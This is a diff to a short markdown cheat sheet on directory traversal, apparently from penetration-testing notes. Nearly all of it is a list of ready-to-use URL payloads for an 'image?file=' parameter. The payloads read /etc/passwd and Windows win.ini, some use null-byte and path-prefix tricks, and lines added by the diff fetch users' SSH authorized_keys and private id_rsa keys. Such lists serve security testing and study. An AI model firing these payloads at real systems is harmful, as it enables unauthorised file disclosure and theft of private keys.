@@ -1,12 +1,12 @@
 ---
 title: Directory Traversal
 desc: 
-tags: [Directory Traversal, Path Traversal, Web]
+tags: [Directory, Path, Traversal, Web]
 alts: [File-Inclusion]
 render_with_liquid: false
 ---
 
-```
+```sh
 /image?file=index.php
 /image?file=index.html
 /image?file=/etc/passwd
@@ -22,4 +22,8 @@ render_with_liquid: false
 /image?file=/var/www/images/../../../etc/passwd%00.png
 
 /image?file=..\..\..\windows\win.ini
+
+# SSH
+/image?file=../../../../../home/<username>/.ssh/authorized_keys
+/image?file=../../../../../home/<username>/.ssh/id_rsa
 ```
